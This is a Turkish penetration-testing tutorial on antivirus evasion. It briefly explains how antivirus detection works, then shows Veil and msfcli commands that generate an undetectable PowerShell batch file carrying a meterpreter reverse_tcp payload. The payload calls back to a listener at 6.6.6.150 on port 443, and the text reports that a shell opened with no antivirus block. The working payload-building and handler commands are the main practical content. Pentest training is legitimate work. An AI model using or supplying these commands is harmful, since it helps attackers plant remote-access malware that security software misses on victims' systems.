### Antivirüs Uygulamalarını Atlatma

#### Antivirus Bypass Teknikleri ve Tanınmaz Meterpreter Ajanı Oluşturma

Pentest çalışmalarında, hedef sistemi ele geçirdikden sonra yetkisiz işlevleri yerine getirecek bir payload'a ihtiyaç duyulur. Bu bir casus yazılım olabilir (trojan), uzakdan yönetim aracı olabilir (rat) veya hedef sistemde kod/komut çalıştırmanıza olanak sağlayan bir araç  (shellcode exec) olabilir.

BGA pentest ekibi, pentest çalışmalarında ve eğitimlerde multi platform çalışan ve gelişmiş özellikleri olan meterpreter payloadını sıklıkla tercih etmektedir.

Antivirus veya sezgisel antilogger'lar bu tür durumlarda işinizi zorlaştırabilir. Bu yazıda, antiviruslerin çalışma prensiblerine kısaca değinilmiş ve meterpreter ajanının antivirusler tarafından tanınmaz hale getirilmesi teorik olarak anlatılmıştır. Burada anlatılan yöntemler, backtrack 5 r2 üzerinde test edilmiştir ve meterpreter için geçerlidir fakat bu mantık  benzeri yazılımlar içinde uygulanabilir !

__Antivirüsler Nasıl Çalışır?__

* İmza tabanlı (Signature Based)
* ShellCode Analizi
* Sezgisel (heuristic)

__İmza tabanlı (Signature Based)__

* Her imza bir zararlının karakteristik özelliklerini barındırır.
* Tespit edilmiş viruslere ait imzaları içerir.
* Hızlı sonuç verir.
* Yeni nesil viruslere karşı savunmasızdır.
* Zararlının tespit edilmesi, veritabanına konulması ve son kullanıcıya ulaşması yeni nesil tehtitler karşısında ciddi zaman kaybı yaşatmakdadır.

__Sezgisel (heuristic)__

* Zararlıyı, sezgisel ve gerçek zamanlı davranış analizi yaparak tespit etmeye çalışır.

#### Veil kullanarak Sızma Testlerinde Antivirüs Atlatma 

Penetrasyon testlerinde sıklıkla antivirus uygulamalarının atlatılması ihtiyacı doğmaktadır. Çeşitli encoding yöntemleri kullanılarak antivirus yazılımları atlatılabilmektedir. Msfpayload, Msfencode, Msfvenom benzeri yazılımlar ile istenilen özelliklerde zararlı yazılım üretmek mümkündür. Aşağıda bunlara alternatif ve oldukça başarılı bir uygulama olan VEIL ile bu işlemin nasıl gerçekleştirilebileceğine değinilmiştir.

Windows işletim sistemleri üzerinde çalışan antiviruslere yakalanmayan batch file oluşturmak için aşağıda ki ilgili komutları çalıştırması yeterlidir. 6.6.6.150 ipsine 443 portu üzerinden reverse bağlantı kurarak erişim sağlanacaktır.

Öncelikle aşağıdaki komut kullanılarak batch file oluşturulabilir. İlgili komut çalıştırıldıktan sonra .bat uzantılı zararlı uygulamamız oluşmuş olacaktır.

```ShellSession
root@kali:#  veil -l powershell -p VirtualAlloc -o undetectable --msfpayload windows/meterpreter/reverse_tcp --msfoptions LHOST=6.6.6.150 LPORT=443
```

![ANTIVIRUS](../resim/ataklar/antivirus/1.png)

![ANTIVIRUS](../resim/ataklar/antivirus/2.png)

Windows üzerinde batch dosyasını çalıştırmadan önce lokal makinamızda 443 portu metasploit ile dinleme moduna alıyoruz.

Aşağıdaki komut ile  443 portunun dinleme moduna alınması sağlanmıştır. Payload olarak reverse_tcp kullanılmıştır.

```ShellSession
root@kali:#  msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=6.6.6.150 LPORT=443 E
```

![ANTIVIRUS](../resim/ataklar/antivirus/3.png)

Windows üzerinde undetectable.bat dosyamızı çalıştırıyoruz. Çalıştırmamızla birlikle meterpreter shell bizi karşılıyor.

![ANTIVIRUS](../resim/ataklar/antivirus/4.png)

Zararlının çalıştırıldığı sistem üzerindeki antivirüsün zararlıyla ilgili herhangi bir bloklama işlemi gerçekleştirmediği aşağıda görülebilmektedir.

![ANTIVIRUS](../resim/ataklar/antivirus/5.png)

Bu şekilde antivirüs atlatılarak mevcut sisteme en üst seviyede erişim sağlanmış olacaktır. 

[KAYNAK](http://blog.bga.com.tr/2014/02/veil-kullanarak-szma-testlerinde.html)

##### DAHA FAZLASI İÇİN

* [Antivirüs Programları Nasıl Çalışır?](http://www.elektrikport.com/teknik-kutuphane/antivirus-programlari-nasil-calisir/11475)
* [Kendi Backdoor'unuzu Oluşturun](http://onuraktas.net/kendi-backdoorunuzu-olusturun/)
* [Antivirüs Atlatma(Bypass)](https://www.youtube.com/watch?v=jGbV9c26N5k)